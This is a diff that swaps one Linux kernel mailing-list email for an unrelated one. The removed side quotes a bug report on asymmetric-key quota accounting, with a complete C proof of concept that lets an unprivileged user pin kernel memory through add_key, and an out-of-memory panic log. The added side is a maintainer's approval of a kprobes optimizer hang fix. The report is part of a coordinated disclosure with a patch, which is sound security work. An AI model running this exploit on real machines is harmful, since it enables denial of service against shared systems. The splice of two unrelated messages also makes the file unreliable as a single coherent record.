@@ -1,571 +1,222 @@
-Received: from mail-ej2-f43.google.com (mail-ej2-f43.google.com [74.125.228.171])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 82DCB4DD3B8
-	for <stable@vger.kernel.org>; Fri, 25 Sep 2026 16:12:44 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.171
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CC3DE4D9573;
+	Fri, 25 Sep 2026 16:38:38 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1790352766; cv=none; b=NdRIFf7Ajk8vDLxqWb7y5qqkphCP5tVMAE22XkIrunkH3+lEZ8Q04qr1oXXFgUsoCT8S3/PaqvjbhhGR1p+IEjWj5nGWny4pzFjU6CFSxamUMVEvZpVJ3vHTPRQmGGSAO3bw6G4Tqr9s2YcCw9acaaEwae3Bdrubw49o7oNl9m0=
+	t=1790354322; cv=none; b=hPOF0KvWGLUjevvlG0119FVG7iXkxek4BX/SzEktpFM/v6wTMLT8O0UxMNo8H9xrKiVHKFpxMiJ9CvuH7sa+Lj2SZyhCVKjvGvQHwJ+6Z9bk60HyaJIY4UmR87mtSVdVubkVqkSZ6i1l3WkJKr4RPi51xNjG7tbeFjqBMPYnjUM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1790352766; c=relaxed/simple;
-	bh=vrQf2mrYbT7jNqO/FrzprzNPDuj6uTq+YuZmoSojmNo=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=f2VlNEqXG9v1QncEc6eCrOTOBZCLWvTlbERjBtBCe41GtwgzAB4IC1/z/dnK0ve1Io2ZRQW3bczOBx91dfu4qFeKWIlZBQR6fbfF0pW0CVrKm1TyUo3bnZT2JzObyC5nQcH5HGEWa6W+Ive/IWp9J6bCwUuPnjyLuCVZoZ5LQlc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=linux.win; spf=pass smtp.mailfrom=gmail.com; arc=none smtp.client-ip=74.125.228.171
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=linux.win
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
-Received: by mail-ej2-f43.google.com with SMTP id a640c23a62f3a-c2af7721e4aso63739366b.1
-        for <stable@vger.kernel.org>; Fri, 25 Sep 2026 09:12:44 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1790352763; x=1790957563;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=BziVQfdZV4sGmL5XYBIvIrmzaMllt3XOtKCm8cyts5U=;
-        b=RU+Bc+5ruQT6hMUoQUBKoT+FFzz1Td1hJF1LuEvxMs5vIIq5w+J4SZUUvsNrGPbbbd
-         Wm7tP0YH4ZnzwmamSWKEwhVAyqvoTBXQx1CiGaGb/wna1587kbG5Fzx8zUefwLEIGEpn
-         MEwSrojc+kQUcu7YFaHi6FSWEfwHebk7xBveZTpgyMT3X90nowBJMPdui+Z4NZ4iD+nN
-         c8DoxlRBXuJlcAjnR2T6sUh0Bt5kGguKUCmJLzwF9zSJzOMy6rJWCM5mO3mxzhzkg+yD
-         c/0IElyIIGCeDFxt/ivcrGAyjPy7bXR9b53wDd4BYH93+gaMi1WWxZ7T9wDbVipCSjdr
-         y/Rw==
-X-Forwarded-Encrypted: i=1; AKwUvBy7M2alsE9PWARJI4PAY9JvAqK0fja5hITgzlkalbvrSb3hvHtH70ismyJgQPKu/wuoKqU0QBg=@vger.kernel.org
-X-Gm-Message-State: AFuF++kdVXxzbrOYBqsFDYk7TByI55hNuFbhv1xEJ4MoqvYOaXFhtUv8
-	Tos1D112vvyYlveSfMnWGBq60R0sAhkkyD4mXq4On+vCpXSCiBJMQJSxugzXIFR13XE=
-X-Gm-Gg: AYBFou2RI52BWYpOk0/XPP4K/QNkFEXjkSduToDjB3/eGRzstSrsg/iCK9klkxAApq8
-	xXPy96UzgMr+MavphIOL2rDHO/EKd2bAweRcqrRZ77BNenPwHlIbTy2Dzl4H4pY4ztcjPKJJxjp
-	YuNhekmfKph2nKakU61NIAUPmUbBpLlrQktX3UaGilF0q503p7QGJgZBrsxXkIgmcgo6oHtd2dZ
-	pgESyjUmiPIrYKJWCF9olZj7ucSnM2Ir78seks+3XYx2L22Be/i7861OnblKxBdDjNjEuQuCNPU
-	VIq8zlDaB1eDSX0rCS5qAeWCoejJ349Q4ybugzSEVcjBQkBM+/TBlg6sbad/+UZaFPMLxy2q0PG
-	j8AG4V0G1Er0esn3uG/q0mVpJG4jS6SLeGD6rvU50sPWr9DYpejGIDg9IhCT4pHCs4wAhZYDTcv
-	pgJGfjht9rt+vnahtByI1qGK/hOrDxv4TGpy63tTOrbcZubokx4QdOBqvZa7shMoo0ObJzeBH0G
-	vriLeP4PVY3uuQcjCEeu0iSHKZa8pWp6L19tRS+0w==
-X-Received: by 2002:a17:907:9406:b0:c26:19de:912c with SMTP id a640c23a62f3a-c2ac256d509mr671880966b.31.1790352762482;
-        Fri, 25 Sep 2026 09:12:42 -0700 (PDT)
-Received: from mail-ej2-f17.google.com (mail-ej2-f17.google.com. [74.125.228.145])
-        by smtp.gmail.com with ESMTPSA id a640c23a62f3a-c2ae780d2ecsm136964466b.56.2026.09.25.09.12.41
-        for <stable@vger.kernel.org>
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Fri, 25 Sep 2026 09:12:41 -0700 (PDT)
-Received: by mail-ej2-f17.google.com with SMTP id a640c23a62f3a-c29d50b7cf9so174137666b.2
-        for <stable@vger.kernel.org>; Fri, 25 Sep 2026 09:12:41 -0700 (PDT)
-X-Forwarded-Encrypted: i=1; AKwUvBwGa1kEVzRjijiANcNTUdDkEFs+/Zj/ncpL4MPSsIOo+BSnGGtNqH3DIIvzGCj9dEvNZhtIILA=@vger.kernel.org
-X-Received: by 2002:a17:907:868d:b0:c26:24ed:39e5 with SMTP id
- a640c23a62f3a-c2ac2427928mr614900666b.18.1790352761318; Fri, 25 Sep 2026
- 09:12:41 -0700 (PDT)
+	s=arc-20240116; t=1790354322; c=relaxed/simple;
+	bh=7JEZFKX+P/T1np0rBfRn5XbrnUCGgHH+54tJTV1OQXU=;
+	h=Date:From:To:Cc:Subject:Message-Id:In-Reply-To:References:
+	 Mime-Version:Content-Type; b=oZL4iBqI4JK15ZEzZ3Z6VlXHtRxk7A29EmrRPKk5colh67jJmkAV8ctJoYD0WX+JJBNcnXL6/NjAXuARe8mAWf14pOEbUUVNrfH7hWCJT64Q+taZjikWWLB4KEIIakU2IHeLDHzP3umkT5fdk7+g0TLpVzorOEpiB+tNdiIuSg0=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=ER993GLF; arc=none smtp.client-ip=100.103.45.18
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="ER993GLF"
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id AA6201F00893;
+	Fri, 25 Sep 2026 16:38:34 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
+	s=k20260515; t=1790354316;
+	bh=Ef5AYQYzA6WRtJxzWsmKVPm+wztV1FQUcjUH5RY8340=;
+	h=Date:From:To:Cc:Subject:In-Reply-To:References;
+	b=ER993GLFdFWegZ1zeJakvYgwmNtNST0z1wbj7yRNKh1rwstT4dVw1BDWN4mx6hRt+
+	 E9q8dgtPMHNudVEujWTF/4jAJ2r+8gLELbFtKKZLSyoOEO6KVpLXgcWItrwUI+oA0Q
+	 CeUlFIdkaIdRVgr1ykl5B1fzAa/gk/ZxMB9IhPCEZv3U2PHJ4mYOsCBXQhliOKU1qV
+	 gfL43YaEpPISCRDVyy/PqZD5z3inJ/Ffsnp+tCCVUmikrnjjZoYhXBmWb24FST4Df1
+	 qIVuDhsBhvztbE1aem5vP93USxJ1GCUTXL64TcW/hargRO7ULBLZWo7eGBSfw80mP4
+	 CUNqT89AnHBUw==
+Date: Sat, 26 Sep 2026 01:38:32 +0900
+From: Masami Hiramatsu (Google) <mhiramat@kernel.org>
+To: Andrea Parri <parri.andrea@gmail.com>
+Cc: Naveen N Rao <naveen@kernel.org>, "David S. Miller"
+ <davem@davemloft.net>, Steven Rostedt <rostedt@goodmis.org>, Josef Bacik
+ <josef@toxicpanda.com>, linux-trace-kernel@vger.kernel.org,
+ linux-kernel@vger.kernel.org, stable@vger.kernel.org
+Subject: Re: [PATCH] kprobes: Fix permanent hang when flushing the kprobe
+ optimizer
+Message-Id: <20260926013832.abaa63a3903d563655bc60d6@kernel.org>
+In-Reply-To: <20260924092142.199198-1-parri.andrea@gmail.com>
+References: <20260924092142.199198-1-parri.andrea@gmail.com>
+X-Mailer: Sylpheed 3.8.0beta1 (GTK+ 2.24.33; x86_64-pc-linux-gnu)
 Precedence: bulk
 X-Mailing-List: stable@vger.kernel.org
 List-Id: <stable.vger.kernel.org>
 List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
-MIME-Version: 1.0
-References: <cover.1789801335.git.xuyuqiabc@gmail.com>
-In-Reply-To: <cover.1789801335.git.xuyuqiabc@gmail.com>
-From: Ignat Korchagin <ignat@linux.win>
-Date: Fri, 25 Sep 2026 17:12:28 +0100
-X-Gmail-Original-Message-ID: <CAOs+rJUXb5169An2OTE4JYBnNhXHEHaR9M2z5xZvUeSfA9QNrw@mail.gmail.com>
-X-Gm-Features: AclHuK-sA6_5_-JSmmg1x8cUtmvbvZYobmyBJtSLEpZqw5HwXISHJ-_PL02RQRQ
-Message-ID: <CAOs+rJUXb5169An2OTE4JYBnNhXHEHaR9M2z5xZvUeSfA9QNrw@mail.gmail.com>
-Subject: Re: [PATCH 0/1] KEYS: Account for asymmetric key payload data in the quota
-To: Yuqi Xu <xuyuqiabc@gmail.com>
-Cc: linux-crypto@vger.kernel.org, David Howells <dhowells@redhat.com>, 
-	Lukas Wunner <lukas@wunner.de>, Herbert Xu <herbert@gondor.apana.org.au>, 
-	"David S . Miller" <davem@davemloft.net>, keyrings@vger.kernel.org, stable@vger.kernel.org, 
-	Vega <vega@nebusec.ai>, Ren Wei <weir@nebusec.ai>, xuyq21@lenovo.com
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Mime-Version: 1.0
+Content-Type: text/plain; charset=US-ASCII
+Content-Transfer-Encoding: 7bit
 
-On Sat, Sep 19, 2026 at 9:46=E2=80=AFAM Yuqi Xu <xuyuqiabc@gmail.com> wrote=
-:
->
-> Hi Linux kernel maintainers,
->
-> We found and validated an issue in
-> crypto/asymmetric_keys/pkcs8_parser.c.  The bug is reachable by a
-> non-root user through add_key("asymmetric", ...); it does not require a
-> user or network namespace.  We've tested the fix and it should not
-> affect other functionality.
->
-> We will provide detailed information about the bug in this email, along
-> with a reproducer.
->
-> ---- details below ----
->
-> Bug details:
+On Thu, 24 Sep 2026 11:21:39 +0200
+Andrea Parri <parri.andrea@gmail.com> wrote:
 
-I feel these details are important and should actually go into the
-commit message. Since you have only 1 patch there is no need for cover
-letter (which will not end up in git anyway). Can you combine this and
-the commit message in the actual patch into 1 patch and send it
-without the cover letter?
+> Writing 0 to /proc/sys/debug/kprobes-optimization while a kprobe is
+> jump-optimized never returns. The writer sleeps in D state forever with
+> kprobe_sysctl_mutex held, so any later read or write of that sysctl
+> hangs as well. For example, with vfs_read+9 as an optimizable address
+> in this build:
+> 
+>   # cd /sys/kernel/tracing
+>   # echo 'p:myprobe vfs_read+9' >> kprobe_events
+>   # echo 1 > events/kprobes/myprobe/enable
+>   # # wait until /sys/kernel/debug/kprobes/list shows [OPTIMIZED]
+>   # echo 0 > /proc/sys/debug/kprobes-optimization
+> 
+>   INFO: task sh:246 blocked for more than 10 seconds.
+>   Call Trace:
+>    <TASK>
+>    __schedule+0x1176/0x4f70
+>    schedule+0xdc/0x2c0
+>    schedule_timeout+0x17b/0x260
+>    wait_for_completion+0x173/0x3c0
+>    wait_for_kprobe_optimizer_locked+0xbc/0x130
+>    proc_kprobes_optimization_handler+0x156/0x1b0
+>    proc_sys_call_handler+0x324/0x490
+>    vfs_write+0x52d/0xfe0
+>    ksys_write+0xff/0x200
+>    do_syscall_64+0x106/0x630
+>    entry_SYSCALL_64_after_hwframe+0x77/0x7f
+>    </TASK>
+>   ...
+>   INFO: task cat:265 is blocked on a mutex likely owned by task sh:246.
+> 
+> wait_for_kprobe_optimizer_locked() reinitializes optimizer_completion,
+> asks the optimizer thread to flush and sleeps in wait_for_completion().
+> The thread drains the (un)optimizing lists, but calls complete() only
+> if completion_done() is true, i.e. if the completion is already done,
+> which never happens while someone waits. disarm_all_kprobes() and
+> kprobe_trace_self_tests_init() wait the same way.
+> 
+> Calling complete() unconditionally would not be enough: the waiter
+> drops kprobe_mutex while it sleeps, and nothing else serializes the
+> sysctl handler against the debugfs "enabled" file. A second flusher
+> that still finds the lists non-empty, e.g. because a disabled probe is
+> queued for unoptimizing, reinitializes the completion under the first:
+> 
+>   sysctl write                      debugfs "enabled" write
+>   unoptimize_all_kprobes()
+>     wait_for_kprobe_optimizer_locked()
+>       init_completion(c)
+>       mutex_unlock(&kprobe_mutex)
+>       wait_for_completion(c)
+>                                     disarm_all_kprobes()
+>                                       wait_for_kprobe_optimizer_locked()
+>                                         init_completion(c)
+>                                           // c->wait is reset, the first
+>                                           // waiter is off the queue
+>                                         mutex_unlock(&kprobe_mutex)
+>                                         wait_for_completion(c)
+>   kprobe_optimizer()
+>     complete(c)
+>       // wakes the debugfs writer only
+> 
+> where c is &optimizer_completion. Lining up the two writes during an
+> optimizer pass loses the sysctl writer this way.
+> 
+> Replace the completion with a counter of optimizer passes, bumped at the
+> end of each pass and signalled with wake_up_var_locked(), both under
+> kprobe_mutex. A flusher samples the count and waits with
+> wait_var_event_mutex(), which drops kprobe_mutex only while sleeping, so
+> a new count means a whole pass ran in the meantime. Nothing is
+> reinitialized, so several flushers can sleep in the wait at once.
+> 
+> Fixes: 73c12f209462 ("kprobes: Use dedicated kthread for kprobe optimizer")
+> Cc: stable@vger.kernel.org
+> Assisted-by: LLM
+> Signed-off-by: Andrea Parri <parri.andrea@gmail.com>
+> ---
+> This overlaps with two patches under discussion in the "rcu-tasks: build
+> Tasks RCU on Tasks Trace readers in trampolines" thread:
+> 
+>  - Masami's RFC "kprobes: Make optprobe optimizer multi-generational and
+>    asynchronous" [1] rewrites the same code.  It drops the
+>    completion_done() check, which fixes the hang reported here, but it
+>    keeps init_completion() in wait_for_kprobe_optimizer_locked(), so the
+>    concurrent-flusher case described above remains.  The two patches
+>    conflict textually.
 
-> add_key("asymmetric", ...) preparses the supplied blob with the
-> registered asymmetric key parsers and then instantiates the key with
-> generic_key_instantiate(), which charges prep->quotalen to the owning
-> user's key quota through key_payload_reserve().
->
-> pkcs8_parse() ASN.1-decodes the outer PKCS#8 structure and duplicates
-> the attacker-controlled PrivateKey OCTET STRING with
-> kmemdup(ctx.key, ctx.key_size, GFP_KERNEL) into pub->key.
-> pkcs8_key_preparse() then stores that object persistently in the
-> asymmetric-key payload, but hard-codes
->
->     prep->quotalen =3D 100;
->
-> so the quota records only 100 bytes regardless of the retained private
-> key size.  The ASN.1 decoder accepts blobs up to 65535 bytes, so one key
-> can pin about 64 KiB of kernel memory while consuming 100 quota bytes.
-> With the default non-root limits (200 keys / 20000 bytes) a user can
-> retain roughly 12 MiB of kernel memory instead of the 20 KiB the limit
-> is meant to allow.
->
-> x509_key_preparse() has the same problem: it keeps the parsed public
-> key, its parameters, the signature, the key IDs and the authority key
-> IDs, but also charges a fixed 100 bytes.  The same add_key() call
-> reaches the X.509 parser, so fixing only PKCS#8 would leave the bypass
-> reachable; the patch accounts
-> for the retained payload in both parsers.
->
-> Measured on v7.3-rc1 (10396a2d6d41), 2 vCPU / 2 GiB QEMU guest.  The
-> test drops to uid 1000 and adds PKCS#8 keys with a 65000-byte
-> PrivateKey field through add_key("asymmetric", ...):
->
-> Before the patch (/proc/key-users, uid 1000):
->   1000:     5 5/5 5/200 259/20000
->   added 176 keys; last add_key: -1 errno=3D122 (Disk quota exceeded)
->   1000:   182 182/181 181/200 19971/20000
-> 176 keys retained about 11.4 MiB of kernel memory, but were charged only
-> 19971 - 259 =3D 19712 bytes in total, about 112 bytes per key.
->
-> After the patch:
->   1000:     5 5/5 5/200 1139/20000
->   added 0 keys; last add_key: -1 errno=3D122 (Disk quota exceeded)
-> The oversized key is rejected immediately, while a small PKCS#8 key
-> (200-byte PrivateKey) still loads and is charged 264 bytes.
->
-> The same holds for a small X.509 certificate whose only large object is
-> a 26000-byte authorityKeyIdentifier key ID: the patch rejects it, while
-> the unpatched kernel accepted it and charged 109 bytes.
->
-> The panic log below was captured by the report during the initial
-> validation.
->
-> Reproducer:
->
->   gcc -O2 -static -o poc poc.c
->   ./poc
->
-> Run the PoC as an unprivileged user; no namespace is needed.  We run it
-> in a 2 vCPU, 2 GB RAM x86 QEMU environment.
->
-> ------BEGIN poc.c------
->
-> #define _GNU_SOURCE
->
-> #include <errno.h>
-> #include <inttypes.h>
-> #include <linux/keyctl.h>
-> #include <stdbool.h>
-> #include <stdint.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <sys/mman.h>
-> #include <sys/syscall.h>
-> #include <sys/types.h>
-> #include <time.h>
-> #include <unistd.h>
->
-> typedef int32_t key_serial_t;
->
-> struct options {
->         size_t payload_size;
->         size_t key_count;
->         size_t anon_mb;
->         unsigned pause_secs;
->         bool revoke_on_exit;
-> };
->
-> static void usage(const char *prog)
-> {
->         fprintf(stderr,
->                 "Usage: %s [--payload-size BYTES] [--key-count N] [--anon=
--mb MB]\n"
->                 "          [--pause SECS] [--revoke-on-exit]\n",
->                 prog);
-> }
->
-> static size_t der_len_bytes(size_t len)
-> {
->         size_t n =3D 0;
->
->         if (len < 0x80)
->                 return 1;
->
->         while (len) {
->                 n++;
->                 len >>=3D 8;
->         }
->
->         return 1 + n;
-> }
->
-> static size_t der_put_len(unsigned char *dst, size_t len)
-> {
->         size_t n =3D 0;
->         size_t tmp =3D len;
->
->         if (len < 0x80) {
->                 dst[0] =3D (unsigned char)len;
->                 return 1;
->         }
->
->         while (tmp) {
->                 n++;
->                 tmp >>=3D 8;
->         }
->
->         dst[0] =3D 0x80 | n;
->         for (size_t i =3D 0; i < n; i++)
->                 dst[1 + i] =3D (unsigned char)(len >> ((n - 1 - i) * 8));
->
->         return 1 + n;
-> }
->
-> static unsigned char *build_pkcs8(size_t payload_size, size_t *blob_len_o=
-ut)
-> {
->         static const unsigned char algo_id[] =3D {
->                 0x30, 0x0d,
->                 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7,
->                 0x0d, 0x01, 0x01, 0x01,
->                 0x05, 0x00,
->         };
->         const size_t octet_total =3D 1 + der_len_bytes(payload_size) + pa=
-yload_size;
->         const size_t seq_content_len =3D 3 + sizeof(algo_id) + octet_tota=
-l;
->         const size_t blob_len =3D 1 + der_len_bytes(seq_content_len) + se=
-q_content_len;
->         unsigned char *blob;
->         unsigned char *p;
->
->         blob =3D malloc(blob_len);
->         if (!blob)
->                 return NULL;
->
->         p =3D blob;
->         *p++ =3D 0x30;
->         p +=3D der_put_len(p, seq_content_len);
->
->         *p++ =3D 0x02;
->         *p++ =3D 0x01;
->         *p++ =3D 0x00;
->
->         memcpy(p, algo_id, sizeof(algo_id));
->         p +=3D sizeof(algo_id);
->
->         *p++ =3D 0x04;
->         p +=3D der_put_len(p, payload_size);
->
->         for (size_t i =3D 0; i < payload_size; i++)
->                 p[i] =3D (unsigned char)(i * 131u + 7u);
->         p +=3D payload_size;
->
->         if ((size_t)(p - blob) !=3D blob_len) {
->                 fprintf(stderr, "internal length mismatch: %zu !=3D %zu\n=
-",
->                         (size_t)(p - blob), blob_len);
->                 free(blob);
->                 return NULL;
->         }
->
->         *blob_len_out =3D blob_len;
->         return blob;
-> }
->
-> static long add_key_syscall(const char *type, const char *desc,
->                             const void *payload, size_t plen,
->                             key_serial_t ringid)
-> {
->         return syscall(SYS_add_key, type, desc, payload, plen, ringid);
-> }
->
-> static long keyctl_syscall(int cmd, unsigned long arg2, unsigned long arg=
-3,
->                            unsigned long arg4, unsigned long arg5)
-> {
->         return syscall(SYS_keyctl, cmd, arg2, arg3, arg4, arg5);
-> }
->
-> static void *spray_anon(size_t anon_mb)
-> {
->         const size_t bytes =3D anon_mb * 1024ULL * 1024ULL;
->         const long page_size =3D sysconf(_SC_PAGESIZE);
->         unsigned char *mapping;
->
->         if (!anon_mb)
->                 return NULL;
->
->         mapping =3D mmap(NULL, bytes, PROT_READ | PROT_WRITE,
->                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
->         if (mapping =3D=3D MAP_FAILED) {
->                 perror("mmap anon");
->                 return NULL;
->         }
->
->         for (size_t off =3D 0; off < bytes; off +=3D (size_t)page_size)
->                 mapping[off] =3D (unsigned char)(off / (size_t)page_size)=
-;
->
->         printf("[*] touched %zu MiB of anonymous memory\n", anon_mb);
->         fflush(stdout);
->         return mapping;
-> }
->
-> static unsigned long parse_u64(const char *name, const char *value)
-> {
->         char *end =3D NULL;
->         unsigned long long out;
->
->         errno =3D 0;
->         out =3D strtoull(value, &end, 0);
->         if (errno || !end || *end) {
->                 fprintf(stderr, "bad value for %s: %s\n", name, value);
->                 exit(1);
->         }
->
->         return (unsigned long)out;
-> }
->
-> int main(int argc, char **argv)
-> {
->         struct options opt =3D {
->                 .payload_size =3D 65000,
->                 .key_count =3D 178,
->                 .anon_mb =3D 700,
->                 .pause_secs =3D 0,
->                 .revoke_on_exit =3D false,
->         };
->         unsigned char *blob =3D NULL;
->         size_t blob_len =3D 0;
->         key_serial_t *serials =3D NULL;
->         void *anon_mapping =3D NULL;
->         size_t added =3D 0;
->         char ring_name[64];
->         int ret =3D 0;
->
->         for (int i =3D 1; i < argc; i++) {
->                 if (!strcmp(argv[i], "--payload-size") && i + 1 < argc) {
->                         opt.payload_size =3D parse_u64("--payload-size", =
-argv[++i]);
->                 } else if (!strcmp(argv[i], "--key-count") && i + 1 < arg=
-c) {
->                         opt.key_count =3D parse_u64("--key-count", argv[+=
-+i]);
->                 } else if (!strcmp(argv[i], "--anon-mb") && i + 1 < argc)=
- {
->                         opt.anon_mb =3D parse_u64("--anon-mb", argv[++i])=
-;
->                 } else if (!strcmp(argv[i], "--pause") && i + 1 < argc) {
->                         opt.pause_secs =3D parse_u64("--pause", argv[++i]=
-);
->                 } else if (!strcmp(argv[i], "--revoke-on-exit")) {
->                         opt.revoke_on_exit =3D true;
->                 } else {
->                         usage(argv[0]);
->                         return 1;
->                 }
->         }
->
->         if (opt.payload_size > (1024U * 1024U - 128U)) {
->                 fprintf(stderr, "payload too large for add_key limit\n");
->                 return 1;
->         }
->
->         blob =3D build_pkcs8(opt.payload_size, &blob_len);
->         if (!blob) {
->                 perror("build_pkcs8");
->                 return 1;
->         }
->
->         serials =3D calloc(opt.key_count, sizeof(*serials));
->         if (!serials) {
->                 perror("calloc serials");
->                 free(blob);
->                 return 1;
->         }
->
->         snprintf(ring_name, sizeof(ring_name), "pkcs8-n6q-%ld", (long)get=
-pid());
->         if (keyctl_syscall(KEYCTL_JOIN_SESSION_KEYRING,
->                            (unsigned long)ring_name, 0, 0, 0) < 0) {
->                 perror("keyctl join_session_keyring");
->                 ret =3D 1;
->                 goto out;
->         }
->
->         printf("[*] payload_size=3D%zu blob_len=3D%zu key_count=3D%zu ano=
-n_mb=3D%zu\n",
->                opt.payload_size, blob_len, opt.key_count, opt.anon_mb);
->         fflush(stdout);
->
->         anon_mapping =3D spray_anon(opt.anon_mb);
->         if (opt.anon_mb && !anon_mapping) {
->                 ret =3D 1;
->                 goto out;
->         }
->
->         for (size_t i =3D 0; i < opt.key_count; i++) {
->                 char desc[32];
->                 long serial;
->
->                 snprintf(desc, sizeof(desc), "k%06zu", i);
->                 serial =3D add_key_syscall("asymmetric", desc, blob, blob=
-_len,
->                                          KEY_SPEC_SESSION_KEYRING);
->                 if (serial < 0) {
->                         fprintf(stderr,
->                                 "[!] add_key failed after %zu keys: errno=
-=3D%d (%s)\n",
->                                 added, errno, strerror(errno));
->                         ret =3D 1;
->                         goto out;
->                 }
->
->                 serials[added++] =3D (key_serial_t)serial;
->                 if ((added % 10) =3D=3D 0 || added =3D=3D 1) {
->                         printf("[+] added %zu keys, last serial=3D%ld\n",
->                                added, serial);
->                         fflush(stdout);
->                 }
->         }
->
->         printf("[+] completed %zu successful add_key calls\n", added);
->         fflush(stdout);
->
->         if (opt.pause_secs) {
->                 printf("[*] sleeping for %u seconds\n", opt.pause_secs);
->                 fflush(stdout);
->                 sleep(opt.pause_secs);
->         }
->
-> out:
->         if (opt.revoke_on_exit) {
->                 for (size_t i =3D 0; i < added; i++)
->                         keyctl_syscall(KEYCTL_REVOKE, serials[i], 0, 0, 0=
-);
->         }
->
->         if (anon_mapping)
->                 munmap(anon_mapping, opt.anon_mb * 1024ULL * 1024ULL);
->         free(serials);
->         free(blob);
->         return ret;
-> }
->
-> ------END poc.c--------
->
-> ----BEGIN crash log----
->
-> [  291.603731][T10195] Kernel panic - not syncing: Out of memory: compuls=
-ory panic_on_oom is enabled
+OK, this fix looks good to me. Let me pick this for probes/fixes and
+rebase mine on top of it. Anyway I think we need both.
 
-Drop time and task id when you send splats
+Thank you,
 
-> [  291.604425][T10195] CPU: 1 UID: 1028 PID: 10195 Comm: poc Not tainted =
-6.12.74 #3
-> [  291.604946][T10195] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX=
-, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-> [  291.605646][T10195] Call Trace:
-> [  291.605889][T10195]  <TASK>
-> [  291.606112][T10195]  dump_stack_lvl+0x3b/0x1f0
-> [  291.606466][T10195]  panic+0x6fe/0x7e0
-> [  291.606767][T10195]  ? dump_header+0x6c2/0x950
-> [  291.607117][T10195]  ? __pfx_panic+0x10/0x10
-> [  291.607458][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.607883][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.608335][T10195]  ? out_of_memory+0x8c5/0x16b0
-> [  291.608714][T10195]  out_of_memory+0x8f3/0x16b0
-> [  291.609092][T10195]  ? __pfx_out_of_memory+0x10/0x10
-> [  291.609483][T10195]  ? lock_acquire+0x2f/0xb0
-> [  291.609824][T10195]  ? __alloc_pages_noprof+0xd59/0x26d0
-> [  291.610258][T10195]  __alloc_pages_noprof+0x1ec3/0x26d0
-> [  291.610688][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.611102][T10195]  ? hlock_class+0x4e/0x130
-> [  291.611463][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.611885][T10195]  ? __pfx___alloc_pages_noprof+0x10/0x10
-> [  291.612350][T10195]  ? __pfx___lock_acquire+0x10/0x10
-> [  291.612755][T10195]  ? __sanitizer_cov_trace_switch+0x54/0x90
-> [  291.613198][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.613615][T10195]  ? policy_nodemask+0xf2/0x4f0
-> [  291.613993][T10195]  alloc_pages_mpol_noprof+0x2ce/0x610
-> [  291.614417][T10195]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
-> [  291.614859][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.615294][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.615709][T10195]  ? xas_load+0x49/0x5b0
-> [  291.616038][T10195]  ? filemap_get_entry+0xd5/0x3c0
-> [  291.616444][T10195]  folio_alloc_noprof+0x23/0xd0
-> [  291.616820][T10195]  filemap_alloc_folio_noprof+0x35d/0x420
-> [  291.617244][T10195]  ? __pfx_filemap_alloc_folio_noprof+0x10/0x10
-> [  291.617694][T10195]  ? filemap_fault+0x631/0x2800
-> [  291.618086][T10195]  __filemap_get_folio+0x53e/0xaf0
-> [  291.618499][T10195]  filemap_fault+0x675/0x2800
-> [  291.618878][T10195]  ? __pfx_filemap_fault+0x10/0x10
-> [  291.619284][T10195]  ? do_pte_missing+0x165a/0x3ff0
-> [  291.619662][T10195]  ? __pfx_lock_release+0x10/0x10
-> [  291.620055][T10195]  ? __pfx_filemap_map_pages+0x10/0x10
-> [  291.620471][T10195]  __do_fault+0x10f/0x4a0
-> [  291.620800][T10195]  ? __pfx_filemap_map_pages+0x10/0x10
-> [  291.621210][T10195]  do_pte_missing+0x174c/0x3ff0
-> [  291.621585][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.622002][T10195]  ? reacquire_held_locks+0x20b/0x4c0
